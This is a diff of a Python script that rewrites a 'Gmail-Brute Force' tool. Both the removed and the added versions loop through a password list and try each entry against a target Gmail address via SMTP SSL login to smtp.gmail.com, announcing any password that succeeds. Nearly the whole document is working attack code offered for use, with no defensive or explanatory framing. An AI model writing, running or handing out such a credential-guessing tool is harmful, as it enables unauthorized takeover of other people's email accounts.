@@ -1,45 +1,71 @@
-#!/usr/bin/python
-'''create by Ha3MrX'''
+#!/usr/bin/python3
+# This Programm Write by Mr.nope
+# Gmail-Brute Force v1.4.3
 import os
-import smtplib
-from os import system
-
+import time
+import sys
+import platform
+try:
+    import smtplib
+    from email.message import EmailMessage
+except ImportError:
+    os.system("pip3 install smtplib")
+    import smtplib
+    from email.message import EmailMessage
+try:
+    from colorama import Fore,init
+    init()
+except ImportError:
+    os.system("pip3 install colorama")
+system = platform.uname()[0]
+End = '\033[0m'
+Run_Err = "\nPlease, Run This Programm on Linux or MacOS!\n"
+banner = Fore.GREEN + """
+.----..----..-.  .-.  .--.  .-..-.        .----. .---. .-. .-..-----..----.    .----. .---. .---. .----..----. """ + Fore.CYAN + " :)" + Fore.GREEN + """
+| |--'} |__}}  \/  { / {} \ { |} |    ___ | {_} }} }}_}| } { |`-' '-'} |__}    } |__}/ {-. \} }}_}| }`-'} |__} 
+| }-`}} '__}| {  } |/  /\  \| }} '--.{___}| {_} }| } \ \ `-' /  } {  } '__}    } '_} \ '-} /| } \ | },-.} '__} 
+`----'`----'`-'  `-'`-'  `-'`-'`----'     `----' `-'-'  `---'   `-'  `----'    `--'   `---' `-'-' `----'`----' 
+                                                                                                              """ + End
 def main():
-   os.system("clear")
-   os.system("figlet Gmail")
-main()
-print ("[1] start the attack")
-print ("[2] exit")
-option = input("==>")
-if option == 1:
-   file_path = raw_input("path of passwords file :")
-else:
-   system("clear")
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
-def login():
-    i = 0
-    user_name = raw_input('target email :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.ehlo()
-    for password in pass_list:
-      i = i + 1
-      print str(i) + '/' + str(len(pass_list))
-      try:
-         server.login(user_name, password)
-         system("clear")
-         main()
-         print ("[+] This Account Has Been Hacked Password :" + password)
-         break
-      except smtplib.SMTPAuthenticationError as e:
-         error = str(e)
-         if error[14] == '<':
-            system("clear")
-            main()
-            print ("[+] this account has been hacked, password" : + password ) 
-
-            break
-         else:
-            print ("[!] password not found => " + password)
-login()
+    os.system("printf '\033]2;Gmail-Brute Force\a'")
+    os.system("clear")
+    print(banner)
+    Addr = input("\nEnter Gmail Address: ")
+    time.sleep(0.35)
+    pass_file = input("\nEnter Passlist: ")
+    time.sleep(0.51)
+    passlist = open(pass_file,"r").read().split()
+    for Password in passlist:
+        try:
+            with smtplib.SMTP_SSL('smtp.gmail.com',465) as s: 
+                s.login(Addr,Password) 
+                print(f"Password: {Password} Found!")
+        except smtplib.SMTPAuthenticationError:
+            print(f"{Password} Not Found!")
+    time.sleep(1)
+    try1()
+def try1():
+    try_to_exit = input("\npress Enter...")
+    if try_to_exit == '':
+        ext()
+    else:
+        ext()
+def ext():
+    print(Fore.GREEN + "Exiting..." + End)
+    sys.exit()
+if __name__ == '__main__':
+    try:
+        try:
+            if system == 'Linux':
+                main()
+            else:
+                print(Run_Err)
+                sys.exit()
+        except KeyboardInterrupt:
+            print("\nCtrl + C")
+            print("\nExiting...")
+            sys.exit()
+    except EOFError:
+        print("\nCtrl + D")
+        print("\nExiting...")
+        sys.exit()
